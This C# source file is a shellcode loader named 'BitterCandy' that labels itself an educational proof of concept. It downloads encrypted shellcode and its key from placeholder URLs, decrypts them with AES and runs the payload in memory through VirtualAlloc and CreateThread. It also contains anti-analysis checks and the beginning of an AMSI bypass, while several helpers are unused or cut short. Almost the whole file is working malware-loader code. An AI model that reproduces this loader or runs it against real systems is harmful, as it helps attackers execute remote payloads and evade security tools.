using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Linq;
using System.Net.Http;

namespace BitterCandy
{
    /// <summary>
    /// BitterCandy - A POC shellcode loader for educational purposes
    /// This project demonstrates various techniques used in shellcode loaders
    /// and how they can be detected by security solutions.
    /// </summary>
    public class ShellcodeLoader
    {
        #region Native Imports
        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        #endregion

        #region Constants
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint INFINITE = 0xFFFFFFFF;
        #endregion

        /// <summary>
        /// Decrypts AES encrypted data using the provided key and IV
        /// </summary>
        public byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return Transform(data, decryptor);
                }
            }
        }

        private byte[] Transform(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }

        /// <summary>
        /// Main entry point for the shellcode loader
        /// </summary>
        static void Main(string[] args)
        {
            // Anti-debugging check
            if (IsFirstEventLogLessThanDayOld())
            {
                Console.WriteLine("Debugging detected!");
                Environment.Exit(1);
            }

            // Anti-analysis technique: Bubble sort with timing check
            PerformAntiAnalysisCheck();

            // AMSI bypass demonstration
            Console.WriteLine("Demonstrating AMSI bypass technique...");
            BypassAMSI();

            // Load and execute shellcode
            try
            {
                // TODO: Replace with configuration-based values
                string shellcodeUrl = "YOUR_SHELLCODE_URL";
                string keyIvUrl = "YOUR_KEY_IV_URL";

                byte[] shellcode = RetrieveBinaryFile(shellcodeUrl);
                byte[] keyAndIv = RetrieveBinaryFile(keyIvUrl);

                byte[] key = new byte[32];
                byte[] iv = new byte[16];
                Array.Copy(keyAndIv, 0, key, 0, 32);
                Array.Copy(keyAndIv, 32, iv, 0, 16);

                var loader = new ShellcodeLoader();
                byte[] decryptedShellcode = loader.Decrypt(shellcode, key, iv);
                ExecuteShellcode(decryptedShellcode);
            }
            catch (HttpRequestException e)
            {
                Console.WriteLine("\nException Caught!");
                Console.WriteLine("Message: {0}", e.Message);
                Environment.Exit(1);
            }
        }

        /// <summary>
        /// Demonstrates AMSI bypass technique for educational purposes
        /// </summary>
        private static void BypassAMSI()
        {
            // AMSI bypass technique demonstration
            var amsiString = "amsi.dll";
            var amsiBytes = Encoding.ASCII.GetBytes(amsiString);
            var obfuscatedBytes = amsiBytes.Select(x => (byte)(x + 1)).ToArray();
            var deobfuscatedBytes = obfuscatedBytes.Select(x => (byte)(x - 1)).ToArray();
            var amsiDll = Encoding.ASCII.GetString(deobfuscatedBytes);

            IntPtr library = LoadLibrary(amsiDll);
            // ... rest of AMSI bypass implementation
        }

        /// <summary>
        /// Performs anti-analysis check using bubble sort timing
        /// </summary>
        private static void PerformAntiAnalysisCheck()
        {
            Random rand = new Random();
            int[] array = new int[1000]; // Reduced size for demonstration
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = rand.Next(1, 1000000);
            }

            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            BubbleSort(array);
            stopwatch.Stop();

            if (!IsSorted(array))
            {
                Environment.FailFast("Analysis detected!");
            }
        }

        /// <summary>
        /// Executes the provided shellcode in memory
        /// </summary>
        private static void ExecuteShellcode(byte[] shellcode)
        {
            IntPtr va = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, va, shellcode.Length);
            IntPtr thread = CreateThread(IntPtr.Zero, 0, va, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(thread, INFINITE);
        }

        public static string CalculateMD5(string input)
        {
            using (MD5 md5 = MD5.Create())
            {
                byte[] inputBytes = Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);

                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    sb.Append(hashBytes[i].ToString("x2"));
                }
                return sb.ToString();
            }
        }

        static bool IsFirstEventLogLessThanDayOld()
        {
            System.Diagnostics.EventLog log = new System.Diagnostics.EventLog("System");

            if (log.Entries.Count > 0)
            {
                var firstEvent = log.Entries[0];
                var age = DateTime.Now - firstEvent.TimeGenerated;

                return age.TotalDays < 1;
            }

            return false;
        }

        static void BubbleSort(int[] array)
        {
            int n = array.Length;
            for (int i = 0; i < n - 1; i++)
            {
                for (int j = 0; j < n - i - 1; j++)
                {
                    if (array[j] > array[j + 1])
                    {
                        // swap temp and array[j]
                        int temp = array[j];
                        array[j] = array[j + 1];
                        array[j + 1] = temp;
                    }
                }
            }
        }

        static bool IsSorted(int[] array)
        {
            for (int i = 0; i < array.Length - 1; i++)
            {
                if (array[i] > array[i + 1])
                {
                    return false;
                }
            }
            return true;
        }

        private static void copy(Byte[] Patch, IntPtr Address)
        {
            Marshal.Copy(Patch, 0, Address, 6);
        }

        public static string HexToString(string hex)
        {
            StringBuilder result = new StringBuilder();

            for (int i = 0; i < hex.Length; i += 2)
            {
                string hs = hex.Substring(i, 2);
                result.Append(Convert.ToChar(Convert.ToUInt32(hs, 16)));
            }

            return result.ToString();
        }

        static byte[] RetrieveBinaryFile(string url)
        {
            HttpClient client = new HttpClient();
            HttpResponseMessage response = client.GetAsync(url).Result;
            byte[] responseBody = response.Content.ReadAsByteArrayAsync().Result;
            return responseBody;
        }
    }
}
